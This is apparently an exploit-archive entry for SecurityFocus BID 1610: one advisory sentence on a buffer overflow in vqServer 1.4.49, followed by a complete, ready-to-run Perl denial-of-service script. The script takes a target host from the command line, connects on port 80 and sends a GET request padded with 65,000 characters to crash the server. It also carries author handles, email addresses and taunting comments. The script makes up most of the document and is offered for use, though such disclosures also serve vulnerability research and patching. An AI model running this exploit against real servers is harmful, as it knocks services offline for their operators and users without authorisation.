source: http://www.securityfocus.com/bid/1610/info

vqServer 1.4.49 is subject to a buffer overflow. If a GET request is sent to the server containing 65 000 characters the server will stop responding. A reboot is required in order to gain normal functionality.


#!/usr/bin/perl 
# DoS exploit for vqServer 1.4.49 
# This vulnerability was discovered by nemesystm 
# (auto45040@hushmail.com)
#
# code by: sinfony    (chinesef00d@hotmail.com) 
# [confess.sins.labs] (http://www.ro0t.nu/csl) 
# and DHC member	    
#
# kiddie quote of the year:
# <gammbitr> dude piffy stfu i bet you don't even know how to exploit it 

die "vqServer 1.4.49 DoS by sinfony (chinesef00d\@hotmail.com)\n
usage: $0 <host> \n" 
if $#ARGV != 0; 

use IO::Socket;

$host = $ARGV[0];
$port = 80;

print "Connecting to $host on port $port...\n"; 
$suck = IO::Socket::INET->
	new(Proto=>"tcp", 
	PeerAddr=>$host,
	PeerPort=>$port)
	|| die "$host isnt a webserver you schmuck.\n"; 

$a = A;
$send = $a x 65000;
	print "Connected, sending exploit.\n";
	print $suck "GET /$send\n"; 
sleep(3); 
	print "Exploit sent. vqServer should be dead.\n";
close($suck)

